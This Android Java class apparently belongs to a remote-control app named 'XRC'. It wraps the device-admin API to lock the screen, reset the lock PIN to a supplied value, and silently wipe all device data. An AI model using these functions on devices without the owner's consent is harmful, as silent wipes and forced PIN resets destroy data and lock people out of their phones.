package com.xrc.system.features;

import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.receiver.DeviceAdminReceiver;

public class DeviceAdmin {
    private static final String TAG = Constants.TAG + ":Admin";
    private static DeviceAdmin instance;
    private final Context ctx;
    private final DevicePolicyManager dpm;
    private final ComponentName admin;

    private DeviceAdmin(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.dpm = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        this.admin = new ComponentName(ctx, DeviceAdminReceiver.class);
    }

    public static synchronized DeviceAdmin get(Context ctx) {
        if (instance == null) instance = new DeviceAdmin(ctx);
        return instance;
    }

    public boolean isActive() {
        return dpm != null && dpm.isAdminActive(admin);
    }

    public void requestActivation() {
        try {
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Activation request failed", e);
        }
    }

    public void lockScreen() {
        try {
            if (dpm != null && isActive()) {
                dpm.lockNow();
            }
        } catch (Exception e) {
            Log.e(TAG, "Lock failed", e);
        }
    }

    public void resetPassword(String pin) {
        try {
            if (dpm != null && isActive()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    dpm.resetPassword(pin, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
                } else {
                    dpm.resetPassword(pin, 0);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Reset password failed", e);
        }
    }

    public void wipeData() {
        try {
            if (dpm != null && isActive()) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    dpm.wipeData(DevicePolicyManager.WIPE_SILENTLY, "XRC wipe");
                } else {
                    dpm.wipeData(0);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Wipe failed", e);
        }
    }
}
